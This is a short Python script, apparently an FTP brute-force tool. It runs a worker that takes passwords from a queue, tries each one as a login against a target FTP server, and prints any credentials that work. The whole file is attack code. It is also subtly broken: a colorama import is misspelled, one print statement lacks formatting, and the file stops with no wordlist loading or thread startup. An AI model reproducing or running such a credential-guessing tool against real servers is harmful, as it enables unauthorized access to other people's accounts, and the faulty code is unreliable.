import ftplib
from threading import Thread
import queue
from colorama import inint, Fore

q = queue.Queue()

n_threads = 30
host = ''
user = ''
port = 21

def connect_ftp():
    global q
    while True:
        password = q.get()
        server = ftplib.FTP()
        print('[!] Trying: {password}')
        try:
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            pass
        else:
            print(f"{Fore.GREEN}[+] Found Credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f'\tPassword: {password}{Fore.RESET}')
